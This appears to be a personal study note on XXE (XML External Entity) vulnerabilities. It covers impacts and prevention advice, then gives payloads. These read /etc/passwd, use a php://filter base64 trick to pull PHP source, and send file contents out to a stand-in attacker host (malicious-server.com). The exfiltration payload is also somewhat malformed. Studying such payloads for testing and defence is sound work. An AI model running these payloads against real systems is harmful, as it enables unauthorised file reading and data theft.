# what is XXE and what it's  impact 

**XXE (XML External Entity)** is a type of vulnerability that arises when an XML parser processes XML input containing a reference to an external entity. This vulnerability can be exploited by attackers to read local files, perform server-side request forgery (SSRF), execute remote code, or cause denial of service (DoS), depending on the system's configuration and the parser's behavior.   an example 
```
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE user [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <user> <name>&xxe;</name> <email>john.doe@example.com</email> </user>`
```
### How XXE Works

An XML External Entity attack occurs when an attacker can manipulate an XML input to include a reference to an external entity. 
### Impacts of XXE Vulnerabilities

1. **Sensitive Data Exposure:**
    
    - Attackers can read sensitive files on the server, such as configuration files, system files, or private keys.
2. **Denial of Service (DoS):**
    
    - An attacker can craft XML payloads that cause the parser to consume excessive resources, leading to DoS. For example, using recursive entity expansion (billion laughs attack).
3. **Server-Side Request Forgery (SSRF):**
    
    - The attacker can force the server to make HTTP requests to internal or external systems, potentially accessing services not directly exposed to the internet.
4. **Remote Code Execution (RCE):**
    
    - In rare cases, XXE can be leveraged to execute arbitrary code on the server, depending on the application's environment and configurations.
5. **Port Scanning:**
    
    - Attackers can use XXE to scan internal network ports, helping them map the 
    - internal network.     
### How to Prevent XXE

1. **Disable DTDs in XML Parsers:**
    
    - Disable the ability to process external entities and DTDs in XML parsers. This is often done through parser configuration.
2. **Use Secure Parsers:**
    
    - Use modern libraries and parsers that are configured securely by default.
3. **Input Validation:**
    
    - Validate and sanitize XML input to prevent malicious data from being processed.
4. **Patch and Update:**
    
    - Keep your XML processing libraries up to date to ensure you're protected against known vulnerabilities.
5. **Use Less Complex Data Formats:**
    
    - If possible, avoid using XML in favor of simpler formats like JSON, which are less prone to this type of attack.   

![[Pasted image 20240827214325.png]]
![[Pasted image 20240827214353.png]]
to use parameter   use %before entity name 
if you want to declare a predefined entitiy you need to encode the name of it



# steps and tricks 
when fetching data from PHP file try to use the encoding function like `php://filter/convert.base64-encode/resource=index.php`
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
    <!ELEMENT title ANY>
    <!ENTITY xxe SYSTEM ".passwd" >
]>
<rss version="1.0" >
    <channel>
     <item>
               <title>&xxe;</title>
      </item>
    </channel>
</rss>
```
if there is RSS check or something 
# a basic code payload to extract file data and send it to a malicious website 

```
<!DOCTYPE root [
  <!-- Define an external entity to read a sensitive file -->
  <!ENTITY % file SYSTEM "file:///etc/passwd">

  <!-- Define a parameter entity that includes the file content -->
  <!ENTITY % fileContent "<![CDATA[%file;]]>">

  <!-- Define another entity that includes the file content as part of a URL -->
  <!ENTITY % data SYSTEM "http://malicious-server.com?fileContent=%fileContent;">
  
  <!-- Use the parameter entity in the XML content -->
  %data;
]>
<root>
  <data>&file;</data>
</root>

```



